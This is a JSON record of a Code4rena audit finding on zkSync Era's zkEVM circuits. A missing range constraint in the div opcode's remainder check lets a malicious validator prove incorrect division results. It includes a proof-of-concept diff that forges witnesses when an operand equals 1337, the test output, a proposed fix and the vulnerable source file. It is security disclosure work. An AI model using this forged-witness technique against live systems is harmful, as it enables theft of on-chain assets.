{
  "Title": "[H-01] Missing range constraint on remainder check in `div` opcode implementation",
  "Content": "\nWhen calculating the remainder of the `div` instruction, the circuit needs to verify that the remainder is less than the divisor. It does this by subtracting the divisor from the remainder and enforcing that the borrow flow is true.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs#L314>\n\n```rust\n// do remainder - divisor\nlet (subtraction_result_unchecked, remainder_is_less_than_divisor) =\n    allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);\n\n// relation is a + b == c + of * 2^N,\n// but we compute d - e + 2^N * borrow = f\n\n// so we need to shuffle\nlet addition_relation = AddSubRelation {\n    a: *src1_view,\n    b: subtraction_result_unchecked,\n    c: remainder_unchecked,\n    of: remainder_is_less_than_divisor,\n};\n\n// unless divisor is 0 (that we handle separately),\n// we require that remainder is < divisor\nremainder_is_less_than_divisor.conditionally_enforce_true(cs, divisor_is_non_zero);\n```\n\nHowever, the code fails to range constrain the result of the subtraction. This allows `subtraction_result_unchecked` to contain limbs that are not representable by a 32-bit unsigned integer. We can use this to force `remainder_is_less_than_divisor` to be true even if the remainder is actually larger than the divisor.\n\n### Impact\n\nA malicious validator could generate and submit a proof with incorrect behavior of the `div` instruction. This would allow the validator to manipulate the behavior of smart contracts that use a `div` instruction. For example, the validator could manipulate the calculated price during the execution of an on-chain DEX and steal all of the assets in the DEX. Since every smart contract that uses a `div` instruction is affected, it is impossible to enumerate all potential impacts.\n\n### Proof of Concept\n\nFor the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code: <https://github.com/chainlight-io/zksync-era-boojum-test-harness>. The patch below can be applied to the test code to demonstrate the vulnerability:\n\n<details>\n\n```diff\ndiff --git a/run.sh b/run.sh\nindex 91e97da..97e2d3b 100644\n--- a/run.sh\n+++ b/run.sh\n@@ -1,2 +1,3 @@\n #!/bin/sh\n-cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 -- --nocapture run_simple\n+# XXX must run as release to avoid debug asserts\n+cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_simple && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_hack\ndiff --git a/zk_evm/src/opcodes/execution/div.rs b/zk_evm/src/opcodes/execution/div.rs\nindex f09d9b9..4e786d3 100644\n--- a/zk_evm/src/opcodes/execution/div.rs\n+++ b/zk_evm/src/opcodes/execution/div.rs\n@@ -48,7 +48,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {\n             );\n             vm_state.perform_dst1_update(PrimitiveValue::empty(), self.dst1_reg_idx);\n         } else {\n-            let (q, r) = src0.div_mod(src1);\n+            let (q, r) = if src0 == U256::from(1337u32) {\n+                (U256::zero(), src0)\n+            } else {\n+                src0.div_mod(src1)\n+            };\n             if set_flags {\n                 let eq = q.is_zero();\n                 let gt = r.is_zero();\ndiff --git a/zkevm_circuits/src/main_vm/opcodes/add_sub.rs b/zkevm_circuits/src/main_vm/opcodes/add_sub.rs\nindex f7c4d0b..418e5ef 100644\n--- a/zkevm_circuits/src/main_vm/opcodes/add_sub.rs\n+++ b/zkevm_circuits/src/main_vm/opcodes/add_sub.rs\n@@ -272,3 +272,66 @@ pub fn allocate_subtraction_result_unchecked<F: SmallField, CS: ConstraintSystem\n \n     (limbs, of)\n }\n+\n+pub fn allocate_subtraction_result_unchecked_hack<F: SmallField, CS: ConstraintSystem<F>>(\n+    cs: &mut CS,\n+    a: &[UInt32<F>; 8],\n+    b: &[UInt32<F>; 8],\n+) -> ([UInt32<F>; 8], Boolean<F>) {\n+    let limbs = cs.alloc_multiple_variables_without_values::<8>();\n+    let of = cs.alloc_variable_without_value();\n+\n+    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {\n+        let value_fn = move |inputs: [F; 16]| {\n+            let mut uf = false;\n+            let mut result = [F::ZERO; 9];\n+            for (idx, (a, b)) in inputs[..8].iter().zip(inputs[8..].iter()).enumerate() {\n+                let a = <u32 as WitnessCastable<F, F>>::cast_from_source(*a);\n+                let b = <u32 as WitnessCastable<F, F>>::cast_from_source(*b);\n+                let (c, new_uf_0) = (a).overflowing_sub(b);\n+                let (c, new_uf_1) = c.overflowing_sub(uf as u32);\n+\n+                uf = new_uf_0 || new_uf_1;\n+\n+                result[idx] = F::from_u64_unchecked(c as u64);\n+            }\n+\n+            result[8] = F::from_u64_unchecked(uf as u64);\n+\n+            if inputs[0].as_u64() == 1337 {\n+                result[7] = F::from_u64_unchecked(1<<32);\n+                result[8] = F::from_u64_unchecked(1);\n+            }\n+\n+            result\n+        };\n+\n+        let dependencies = Place::from_variables([\n+            a[0].get_variable(),\n+            a[1].get_variable(),\n+            a[2].get_variable(),\n+            a[3].get_variable(),\n+            a[4].get_variable(),\n+            a[5].get_variable(),\n+            a[6].get_variable(),\n+            a[7].get_variable(),\n+            b[0].get_variable(),\n+            b[1].get_variable(),\n+            b[2].get_variable(),\n+            b[3].get_variable(),\n+            b[4].get_variable(),\n+            b[5].get_variable(),\n+            b[6].get_variable(),\n+            b[7].get_variable(),\n+        ]);\n+        let outputs = Place::from_variables([\n+            limbs[0], limbs[1], limbs[2], limbs[3], limbs[4], limbs[5], limbs[6], limbs[7], of,\n+        ]);\n+        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);\n+    }\n+\n+    let limbs = limbs.map(|el| unsafe { UInt32::from_variable_unchecked(el) });\n+    let of = unsafe { Boolean::from_variable_unchecked(of) };\n+\n+    (limbs, of)\n+}\ndiff --git a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\nindex dbfbeb3..ffecb7a 100644\n--- a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\n+++ b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\n@@ -101,7 +101,9 @@ pub fn allocate_div_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>(\n             let a = allocate_u256_from_limbs(&inputs[0..8]);\n             let b = allocate_u256_from_limbs(&inputs[8..16]);\n \n-            let (quotient, remainder) = if b.is_zero() {\n+            let (quotient, remainder) = if b == U256::from(1337u32) {\n+                (U256::zero(), b)\n+            } else if b.is_zero() {\n                 (U256::zero(), U256::zero())\n             } else {\n                 a.div_mod(b)\n@@ -313,7 +315,7 @@ pub(crate) fn apply_mul_div<F: SmallField, CS: ConstraintSystem<F>>(\n \n     // do remainder - divisor\n     let (subtraction_result_unchecked, remainder_is_less_than_divisor) =\n-        allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);\n+        allocate_subtraction_result_unchecked_hack(cs, &remainder_unchecked, src1_view);\n \n     // relation is a + b == c + of * 2^N,\n     // but we compute d - e + 2^N * borrow = f\ndiff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rs\nindex 76ac16c..f4e184d 100644\n--- a/zkevm_test_harness/src/tests/run_manually.rs\n+++ b/zkevm_test_harness/src/tests/run_manually.rs\n@@ -41,6 +41,43 @@ fn run_simple() {\n         log.event.first r1, r2, r0\n         log.to_l1.first r1, r2, r0\n \n+        add 1336, r0, r1\n+        div r1, r1, r2, r3\n+        add 1, r0, r4\n+        sstore r2, r4\n+        add 2, r0, r4\n+        sstore r3, r4\n+\n+        ret.ok r0\n+    \"#;\n+\n+    run_and_try_create_witness_inner(asm, 50);\n+}\n+\n+#[test]\n+fn run_hack() {\n+    let asm = r#\"\n+        .text\n+        .file\t\"Test_26\"\n+        .rodata.cst32\n+        .p2align\t5\n+        .text\n+        .globl\t__entry\n+    __entry:\n+    .main:\n+        add 1, r0, r1\n+        add 2, r0, r2\n+        sstore r1, r2\n+        log.event.first r1, r2, r0\n+        log.to_l1.first r1, r2, r0\n+\n+        add 1337, r0, r1\n+        div r1, r1, r2, r3\n+        add 1, r0, r4\n+        sstore r2, r4\n+        add 2, r0, r4\n+        sstore r3, r4\n+\n         ret.ok r0\n     \"#;\n```\n\n</details>\n\nWe demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value `1337` is in a source operand. There are two tests that will run: source value of `1336` to show the normal behavior, and source value of `1337` to show the vulnerable behavior.\n\nThe relevant output of `run.sh` is the VM registers during the execution trace and is included below:\n\n    Made snapshot at cycle 1029\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336 <-- dividend and divisor\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 1 <-- quotient\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0 <-- remainder\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    ...\n\n    Made snapshot at cycle 1029\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337 <-- dividend and divisor\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 0 <-- quotient\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 1337 <-- remainder\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    ...\n\nWe see that the result of the `div` instruction in the normal example is as expected: `1336 / 1336 = 1`. However, in the vulnerable example, the result is incorrect: `1337 / 1337 = 1337`. While we chose to set the result to the same value as the source operand, it could be other values as well.\n\n### Recommended Mitigation Steps\n\nThe `subtraction_result_unchecked` variable should be range constrained. An example fix might look like:\n\n```rust\nlet (subtraction_result_unchecked, remainder_is_less_than_divisor) =\n    allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);\nlet subtraction_result = subtraction_result_unchecked.map(|el| UInt32::from_variable_checked(cs, el.get_variable()));\n```\n\n**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/1133#issuecomment-1794470400)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/1133#issuecomment-1830116562):**\n > The Warden has shown and weaponized a lack of a constraint in the `div` opcode, which has been weaponized to pass an invalid proof.\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-10-zksync",
  "Code": [
    {
      "filename": "code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs",
      "content": "use self::ethereum_types::U256;\nuse super::*;\n\nuse crate::base_structures::register::VMRegister;\nuse crate::base_structures::vm_state::ArithmeticFlagsPort;\nuse arrayvec::ArrayVec;\nuse boojum::gadgets::u256::{decompose_u256_as_u32x8, UInt256};\n\nfn allocate_u256_from_limbs<F: SmallField>(limbs: &[F]) -> U256 {\n    debug_assert_eq!(limbs.len(), 8);\n\n    let mut byte_array = [0u8; 32];\n    for (dst, limb) in byte_array.array_chunks_mut::<4>().zip(limbs.iter()) {\n        *dst = (limb.as_u64_reduced() as u32).to_le_bytes();\n    }\n\n    U256::from_little_endian(&byte_array)\n}\n\npub fn allocate_mul_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>(\n    cs: &mut CS,\n    a: &[UInt32<F>; 8],\n    b: &[UInt32<F>; 8],\n) -> ([UInt32<F>; 8], [UInt32<F>; 8]) {\n    let limbs_low = cs.alloc_multiple_variables_without_values::<8>();\n    let limbs_high = cs.alloc_multiple_variables_without_values::<8>();\n\n    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {\n        let value_fn = move |inputs: [F; 16]| {\n            let a = allocate_u256_from_limbs(&inputs[0..8]);\n            let b = allocate_u256_from_limbs(&inputs[8..16]);\n            let mut c_bytes = [0u8; 64];\n            a.full_mul(b).to_little_endian(&mut c_bytes[..]);\n\n            let mut outputs = [F::ZERO; 16];\n            let mut byte_array = [0u8; 4];\n            for (in_chunk, out_elem) in c_bytes.chunks(4).zip(outputs.iter_mut()) {\n                byte_array.copy_from_slice(in_chunk);\n                let as_u32 = u32::from_le_bytes(byte_array);\n                *out_elem = F::from_u64_unchecked(as_u32 as u64);\n            }\n\n            outputs\n        };\n\n        let dependencies = Place::from_variables([\n            a[0].get_variable(),\n            a[1].get_variable(),\n            a[2].get_variable(),\n            a[3].get_variable(),\n            a[4].get_variable(),\n            a[5].get_variable(),\n            a[6].get_variable(),\n            a[7].get_variable(),\n            b[0].get_variable(),\n            b[1].get_variable(),\n            b[2].get_variable(),\n            b[3].get_variable(),\n            b[4].get_variable(),\n            b[5].get_variable(),\n            b[6].get_variable(),\n            b[7].get_variable(),\n        ]);\n        let outputs = Place::from_variables([\n            limbs_low[0],\n            limbs_low[1],\n            limbs_low[2],\n            limbs_low[3],\n            limbs_low[4],\n            limbs_low[5],\n            limbs_low[6],\n            limbs_low[7],\n            limbs_high[0],\n            limbs_high[1],\n            limbs_high[2],\n            limbs_high[3],\n            limbs_high[4],\n            limbs_high[5],\n            limbs_high[6],\n            limbs_high[7],\n        ]);\n        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);\n    }\n\n    let limbs_low = limbs_low.map(|el| unsafe { UInt32::from_variable_unchecked(el) });\n    let limbs_high = limbs_high.map(|el| unsafe { UInt32::from_variable_unchecked(el) });\n\n    (limbs_low, limbs_high)\n}\n\npub fn allocate_div_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>(\n    cs: &mut CS,\n    a: &[UInt32<F>; 8],\n    b: &[UInt32<F>; 8],\n) -> ([UInt32<F>; 8], [UInt32<F>; 8]) {\n    let quotient = cs.alloc_multiple_variables_without_values::<8>();\n    let remainder = cs.alloc_multiple_variables_without_values::<8>();\n\n    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {\n        let value_fn = move |inputs: [F; 16]| {\n            let a = allocate_u256_from_limbs(&inputs[0..8]);\n            let b = allocate_u256_from_limbs(&inputs[8..16]);\n\n            let (quotient, remainder) = if b.is_zero() {\n                (U256::zero(), U256::zero())\n            } else {\n                a.div_mod(b)\n            };\n\n            let mut outputs = [F::ZERO; 16];\n            for (dst, src) in outputs[..8]\n                .iter_mut()\n                .zip(decompose_u256_as_u32x8(quotient).into_iter())\n            {\n                *dst = F::from_u64_unchecked(src as u64);\n            }\n            for (dst, src) in outputs[8..]\n                .iter_mut()\n                .zip(decompose_u256_as_u32x8(remainder).into_iter())\n            {\n                *dst = F::from_u64_unchecked(src as u64);\n            }\n\n            outputs\n        };\n\n        let dependencies = Place::from_variables([\n            a[0].get_variable(),\n            a[1].get_variable(),\n            a[2].get_variable(),\n            a[3].get_variable(),\n            a[4].get_variable(),\n            a[5].get_variable(),\n            a[6].get_variable(),\n            a[7].get_variable(),\n            b[0].get_variable(),\n            b[1].get_variable(),\n            b[2].get_variable(),\n            b[3].get_variable(),\n            b[4].get_variable(),\n            b[5].get_variable(),\n            b[6].get_variable(),\n            b[7].get_variable(),\n        ]);\n        let outputs = Place::from_variables([\n            quotient[0],\n            quotient[1],\n            quotient[2],\n            quotient[3],\n            quotient[4],\n            quotient[5],\n            quotient[6],\n            quotient[7],\n            remainder[0],\n            remainder[1],\n            remainder[2],\n            remainder[3],\n            remainder[4],\n            remainder[5],\n            remainder[6],\n            remainder[7],\n        ]);\n        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);\n    }\n\n    let quotient = quotient.map(|el| unsafe { UInt32::from_variable_unchecked(el) });\n    let remainder = remainder.map(|el| unsafe { UInt32::from_variable_unchecked(el) });\n\n    (quotient, remainder)\n}\n\npub fn all_limbs_are_zero<F: SmallField, CS: ConstraintSystem<F>>(\n    cs: &mut CS,\n    limbs: &[UInt32<F>; 8],\n) -> Boolean<F> {\n    let limb_is_zero = limbs.map(|el| el.is_zero(cs));\n    let result_is_zero = Boolean::multi_and(cs, &limb_is_zero);\n\n    result_is_zero\n}\n\npub fn all_limbs_are_equal<F: SmallField, CS: ConstraintSystem<F>>(\n    cs: &mut CS,\n    lhs: &[UInt32<F>; 8],\n    rhs: &[UInt32<F>; 8],\n) -> Boolean<F> {\n    let boolean_false = Boolean::allocated_constant(cs, false);\n    let mut flags = [boolean_false; 8];\n    for ((lhs_limb, rhs_limb), out) in lhs.iter().zip(rhs.iter()).zip(flags.iter_mut()) {\n        *out = UInt32::equals(cs, lhs_limb, rhs_limb);\n    }\n    let result = Boolean::multi_and(cs, &flags);\n\n    result\n}\n\npub(crate) fn apply_mul_div<F: SmallField, CS: ConstraintSystem<F>>(\n    cs: &mut CS,\n    _draft_vm_state: &VmLocalState<F>,\n    common_opcode_state: &CommonOpcodeState<F>,\n    _opcode_carry_parts: &AfterDecodingCarryParts<F>,\n    diffs_accumulator: &mut StateDiffsAccumulator<F>,\n) {\n    const MUL_OPCODE: zkevm_opcode_defs::Opcode =\n        zkevm_opcode_defs::Opcode::Mul(zkevm_opcode_defs::MulOpcode);\n    const DIV_OPCODE: zkevm_opcode_defs::Opcode =\n        zkevm_opcode_defs::Opcode::Div(zkevm_opcode_defs::DivOpcode);\n\n    let should_apply_mul = common_opcode_state\n        .decoded_opcode\n        .properties_bits\n        .boolean_for_opcode(MUL_OPCODE);\n    let should_apply_div = common_opcode_state\n        .decoded_opcode\n        .properties_bits\n        .boolean_for_opcode(DIV_OPCODE);\n\n    if crate::config::CIRCUIT_VERSOBE {\n        if (should_apply_mul.witness_hook(&*cs))().unwrap_or(false) {\n            println!(\"Applying MUL\");\n        }\n        if (should_apply_div.witness_hook(&*cs))().unwrap_or(false) {\n            println!(\"Applying DIV\");\n        }\n    }\n\n    let should_set_flags = common_opcode_state\n        .decoded_opcode\n        .properties_bits\n        .flag_booleans[SET_FLAGS_FLAG_IDX];\n\n    let src0_view = &common_opcode_state.src0_view.u32x8_view;\n    let src1_view = &common_opcode_state.src1_view.u32x8_view;\n\n    let (mul_low_unchecked, mul_high_unchecked) =\n        allocate_mul_result_unchecked(cs, src0_view, src1_view);\n    let (quotient_unchecked, remainder_unchecked) =\n        allocate_div_result_unchecked(cs, src0_view, src1_view);\n\n    // if crate::config::CIRCUIT_VERSOBE {\n    //     if (should_apply_mul.witness_hook(&*cs))().unwrap_or(false) || (should_apply_div.witness_hook(&*cs))().unwrap_or(false) {\n    //         dbg!(mul_low_unchecked.witness_hook(&*cs)().unwrap());\n    //         dbg!(mul_high_unchecked.witness_hook(&*cs)().unwrap());\n    //         dbg!(quotient_unchecked.witness_hook(&*cs)().unwrap());\n    //         dbg!(remainder_unchecked.witness_hook(&*cs)().unwrap());\n    //     }\n    // }\n\n    let to_enforce_0 = UInt32::parallel_select(\n        cs,\n        should_apply_mul,\n        &mul_low_unchecked,\n        &quotient_unchecked,\n    );\n    let result_0 = to_enforce_0.map(|el| UInt32::from_variable_checked(cs, el.get_variable()));\n    let to_enforce_1 = UInt32::parallel_select(\n        cs,\n        should_apply_mul,\n        &mul_high_unchecked,\n        &remainder_unchecked,\n    );\n    let result_1 = to_enforce_1.map(|el| UInt32::from_variable_checked(cs, el.get_variable()));\n\n    // if we mull: src0 * src1 = mul_low + (mul_high << 256) => rem = 0, a = src0, b = src1, mul_low = mul_low, mul_high = mul_high\n    // if we divide: src0 = q * src1 + rem =>                   rem = rem, a = quotient, b = src1, mul_low = src0, mul_high = 0\n    let uint256_zero = UInt256::zero(cs);\n\n    let rem_to_enforce = UInt32::parallel_select(\n        cs,\n        should_apply_mul,\n        &uint256_zero.inner,\n        &remainder_unchecked,\n    );\n    let a_to_enforce =\n        UInt32::parallel_select(cs, should_apply_mul, src0_view, &quotient_unchecked);\n    let b_to_enforce = src1_view.clone();\n    let mul_low_to_enforce =\n        UInt32::parallel_select(cs, should_apply_mul, &mul_low_unchecked, &src0_view);\n    let mul_high_to_enforce = UInt32::parallel_select(\n        cs,\n        should_apply_mul,\n        &mul_high_unchecked,\n        &uint256_zero.inner,\n    );\n\n    let mul_relation = MulDivRelation {\n        a: a_to_enforce,\n        b: b_to_enforce,\n        rem: rem_to_enforce,\n        mul_low: mul_low_to_enforce,\n        mul_high: mul_high_to_enforce,\n    };\n\n    // flags which are set in case of executing mul\n    let high_is_zero = all_limbs_are_zero(cs, &mul_high_unchecked);\n    let low_is_zero = all_limbs_are_zero(cs, &mul_low_unchecked);\n    let of_mul = high_is_zero.negated(cs);\n    let eq_mul = low_is_zero;\n    let gt_mul = {\n        let x = of_mul.negated(cs);\n        let y = eq_mul.negated(cs);\n        Boolean::multi_and(cs, &[x, y])\n    };\n\n    // flags which are set in case of executing div\n    let divisor_is_zero = all_limbs_are_zero(cs, src1_view);\n    let divisor_is_non_zero = divisor_is_zero.negated(cs);\n    // check if quotient and remainder are 0\n    let quotient_is_zero = all_limbs_are_zero(cs, &quotient_unchecked);\n    let remainder_is_zero = all_limbs_are_zero(cs, &remainder_unchecked);\n\n    // check that remainder is smaller than divisor\n\n    // do remainder - divisor\n    let (subtraction_result_unchecked, remainder_is_less_than_divisor) =\n        allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);\n\n    // relation is a + b == c + of * 2^N,\n    // but we compute d - e + 2^N * borrow = f\n\n    // so we need to shuffle\n    let addition_relation = AddSubRelation {\n        a: *src1_view,\n        b: subtraction_result_unchecked,\n        c: remainder_unchecked,\n        of: remainder_is_less_than_divisor,\n    };\n\n    // unless divisor is 0 (that we handle separately),\n    // we require that remainder is < divisor\n    remainder_is_less_than_divisor.conditionally_enforce_true(cs, divisor_is_non_zero);\n\n    // if divisor is 0, then we assume quotient and remainder to be 0\n\n    quotient_is_zero.conditionally_enforce_true(cs, divisor_is_zero);\n    remainder_is_zero.conditionally_enforce_true(cs, divisor_is_zero);\n\n    let of_div = divisor_is_zero;\n    let eq_div = {\n        let x = divisor_is_zero.negated(cs);\n        Boolean::multi_and(cs, &[x, quotient_is_zero])\n    };\n    let gt_div = {\n        let y = divisor_is_zero.negated(cs);\n        Boolean::multi_and(cs, &[y, remainder_is_zero])\n    };\n\n    let of = Boolean::conditionally_select(cs, should_apply_mul, &of_mul, &of_div);\n    let eq = Boolean::conditionally_select(cs, should_apply_mul, &eq_mul, &eq_div);\n    let gt = Boolean::conditionally_select(cs, should_apply_mul, &gt_mul, &gt_div);\n\n    let candidate_flags = ArithmeticFlagsPort {\n        overflow_or_less_than: of,\n        equal: eq,\n        greater_than: gt,\n    };\n\n    let apply_any = Boolean::multi_or(cs, &[should_apply_mul, should_apply_div]);\n    let dst0 = VMRegister {\n        is_pointer: Boolean::allocated_constant(cs, false),\n        value: UInt256 { inner: result_0 },\n    };\n    let dst1 = VMRegister {\n        is_pointer: Boolean::allocated_constant(cs, false),\n        value: UInt256 { inner: result_1 },\n    };\n\n    // if crate::config::CIRCUIT_VERSOBE {\n    //     if (should_apply_mul.witness_hook(&*cs))().unwrap_or(false) || (should_apply_div.witness_hook(&*cs))().unwrap_or(false) {\n    //         dbg!(result_0.witness_hook(&*cs)().unwrap());\n    //         dbg!(result_1.witness_hook(&*cs)().unwrap());\n    //     }\n    // }\n\n    let can_write_into_memory = MUL_OPCODE.can_write_dst0_into_memory(SUPPORTED_ISA_VERSION);\n    debug_assert_eq!(\n        can_write_into_memory,\n        DIV_OPCODE.can_write_dst0_into_memory(SUPPORTED_ISA_VERSION)\n    );\n\n    diffs_accumulator\n        .dst_0_values\n        .push((can_write_into_memory, apply_any, dst0));\n    diffs_accumulator.dst_1_values.push((apply_any, dst1));\n    let set_flags_and_execute = Boolean::multi_and(cs, &[apply_any, should_set_flags]);\n    diffs_accumulator\n        .flags\n        .push((set_flags_and_execute, candidate_flags));\n\n    let mut add_sub_relations = ArrayVec::new();\n    add_sub_relations.push(addition_relation);\n    diffs_accumulator\n        .add_sub_relations\n        .push((apply_any, add_sub_relations));\n\n    let mut mul_div_relations = ArrayVec::new();\n    mul_div_relations.push(mul_relation);\n    diffs_accumulator\n        .mul_div_relations\n        .push((apply_any, mul_div_relations));\n}"
    }
  ]
}